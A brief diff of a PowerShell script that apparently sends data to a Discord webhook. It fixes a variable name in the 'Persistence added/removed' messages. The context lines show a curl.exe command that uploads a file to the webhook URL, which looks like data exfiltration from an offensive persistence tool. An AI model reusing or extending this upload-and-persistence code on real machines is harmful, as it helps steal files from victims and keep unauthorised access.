@@ -87,10 +87,10 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 if ($pers -eq 'Remove'){
-$text='Persistence removed from '+$env:user
+$text='Persistence removed from '+$env:username
 }
 if ($pers -eq 'True'){
-$test='Persistence added onto '+$env:user
+$test='Persistence added onto '+$env:username
 }
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text $text}
 
